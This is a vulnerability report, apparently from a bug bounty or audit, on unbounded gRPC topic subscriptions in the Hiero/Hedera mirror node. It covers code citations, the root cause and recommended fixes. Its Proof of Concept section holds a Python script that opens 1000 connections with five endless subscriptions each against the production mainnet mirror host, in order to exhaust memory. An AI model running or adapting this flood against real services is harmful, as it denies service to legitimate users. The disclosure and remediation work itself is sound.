### Title
Unbounded Concurrent Subscriber Allocation Enables OOM-Based DoS on gRPC Mirror Node

### Summary
`TopicMessageServiceImpl.subscribeTopic()` allocates a `TopicContext` object and constructs a full Reactor pipeline for every inbound gRPC subscription request before any global subscriber cap is checked. The only server-side concurrency control, `maxConcurrentCallsPerConnection = 5`, is scoped per TCP connection, not globally. An unauthenticated attacker opening many TCP connections can create an unbounded number of concurrent subscriptions, exhausting JVM heap and crashing the gRPC service.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `subscribeTopic()`, lines 59–92.

**Root cause — eager allocation with no global cap:**

At line 61, a `TopicContext` is instantiated unconditionally for every call:
```java
TopicContext topicContext = new TopicContext(filter);   // line 61
```
`TopicContext` holds an `AtomicLong`, an `AtomicReference`, a Guava `Stopwatch`, an `EntityId`, and a `TopicMessageFilter`. Three additional `Flux` chains (`historical`, `live`, `safetyCheck`) are also constructed at lines 63–70 before any subscription occurs.

The subscriber counter is only incremented inside `doOnSubscribe` at line 89:
```java
.doOnSubscribe(s -> subscriberCount.incrementAndGet())   // line 89
```
There is no check of `subscriberCount` against any maximum before this point, and no check at all before the `TopicContext` allocation at line 61.

**Why the existing per-connection limit is insufficient:**

`GrpcConfiguration.java` line 33 applies:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
`NettyProperties.java` line 14 sets the default to `5`. This caps concurrent gRPC streams **per TCP connection**, but there is no configured limit on the number of TCP connections (`maxConnections` is never set on the `NettyServerBuilder`). An attacker opening *N* TCP connections can sustain *5N* concurrent subscriptions simultaneously. `GrpcProperties` contains no `maxSubscribers` field whatsoever.

**Exploit flow:**

1. Attacker identifies any valid topic ID (all topic IDs are public on the Hedera network).
2. Attacker opens many TCP connections to port 5600 (the gRPC port).
3. On each connection, attacker issues up to 5 `subscribeTopic` RPCs with no `endTime` (infinite subscription, `pastEndTime` returns `Flux.never()` at line 125).
4. Each call allocates a `TopicContext` + three `Flux` pipelines + a `Mono.delay` scheduler entry.
5. With enough connections, heap is exhausted → `OutOfMemoryError` → JVM crash or severe GC pressure rendering the service unresponsive.

**Why `topicExists` does not mitigate this:**

The `topicExists` check (lines 94–106) requires a valid topic ID, but topic IDs are publicly enumerable on the Hedera network. The check is a database lookup, not a subscriber cap. It does not prevent repeated subscriptions to the same valid topic.

### Impact Explanation
The gRPC mirror node service becomes unavailable (OOM crash or GC thrashing). All clients relying on `subscribeTopic` for HCS topic message streaming lose service. The mirror node is a read-only service and does not participate in Hedera consensus, so this does not halt transaction confirmation on the main network; however, it constitutes a complete denial of the gRPC mirror node API, which is the primary interface for HCS consumers.

### Likelihood Explanation
The attack requires: (a) network access to the gRPC port (publicly exposed in production deployments), (b) knowledge of one valid topic ID (trivially obtained from the public ledger or REST API), and (c) the ability to open many TCP connections (standard capability of any host). No authentication is required. The attack is fully repeatable and scriptable. A single attacker machine with a modest number of open connections can sustain the pressure indefinitely.

### Recommendation
1. **Add a global subscriber cap** in `subscribeTopic()` before the `TopicContext` allocation:
   ```java
   if (subscriberCount.get() >= grpcProperties.getMaxSubscribers()) {
       return Flux.error(new StatusRuntimeException(Status.RESOURCE_EXHAUSTED));
   }
   TopicContext topicContext = new TopicContext(filter);
   ```
   Add `maxSubscribers` (e.g., default `500`) to `GrpcProperties`.

2. **Add a total connection limit** in `GrpcConfiguration`:
   ```java
   serverBuilder.maxConnectionAge(grpcProperties.getNetty().getMaxConnectionAge(), TimeUnit.SECONDS);
   serverBuilder.maxConnections(grpcProperties.getNetty().getMaxConnections());
   ```

3. **Move `TopicContext` allocation inside `doOnSubscribe`** so no heap is consumed for requests that are rejected before subscription.

4. **Add per-IP rate limiting** at the ingress/load-balancer layer for the gRPC port.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2, basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def flood():
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM)
        # no consensusEndTime → infinite subscription
    )
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection limit)
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        try:
            next(iter(s))  # keep stream alive
        except Exception:
            pass

threads = [threading.Thread(target=flood) for _ in range(1000)]  # 1000 connections × 5 = 5000 subscriptions
for t in threads:
    t.start()
for t in threads:
    t.join()
# Expected: gRPC service OOM / unresponsive after heap exhaustion
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L17-30)
```java
public class GrpcProperties {

    private boolean checkTopicExists = true;

    @NotNull
    private Duration endTimeInterval = Duration.ofSeconds(30);

    @Min(1)
    private int entityCacheSize = 50_000;

    @NotNull
    @Valid
    private NettyProperties netty = new NettyProperties();
}
```
